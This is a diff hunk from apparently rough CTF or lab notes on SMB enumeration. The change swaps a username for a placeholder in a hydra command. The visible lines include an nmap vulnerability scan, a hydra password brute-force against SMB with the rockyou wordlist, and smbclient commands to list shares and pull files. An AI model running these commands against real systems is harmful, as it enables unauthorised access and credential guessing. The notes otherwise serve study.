@@ -59,7 +59,7 @@ Ssh -i id_rsa username@Ip
 Ls, the we can find txt file there
 OR SMB enumeration
 nmap -T4 -Ss -p 139,445 - -script vuln subnet
-hydra-l henry -P /home/Desktop/rockyou.txt IP smb
+hydra-l username -P /home/Desktop/rockyou.txt IP smb
 smbclient //IP/share 
 smbclient -L IP ....ls 
 get file.txt 
